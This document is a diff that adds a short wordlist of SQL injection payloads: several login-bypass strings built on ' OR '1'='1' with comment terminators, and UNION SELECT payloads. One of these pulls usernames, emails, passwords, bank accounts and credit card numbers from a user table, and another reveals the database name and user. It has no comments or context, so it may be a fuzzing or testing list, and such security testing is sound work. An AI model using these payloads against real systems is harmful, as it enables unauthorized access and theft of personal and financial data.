@@ -1,0 +1,14 @@
+" OR "1"="1" --
+' OR 1=1 --
+' OR '1'='1' -- 
+") OR "1"="1" --
+' OR '1'='1' # 
+' OR '1'='1'/*
+" OR 1=1 --
+" OR '1'='1' -- -
+" OR '1'='1' #
+" OR '1'='1'/*
+' OR 1=1 -- -
+' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL' --  
+' UNION SELECT NULL, username, email, password, bank_account, credit_card FROM user' --  
+' UNION SELECT NULL, database(), user(), NULL, NULL, NULL '--  
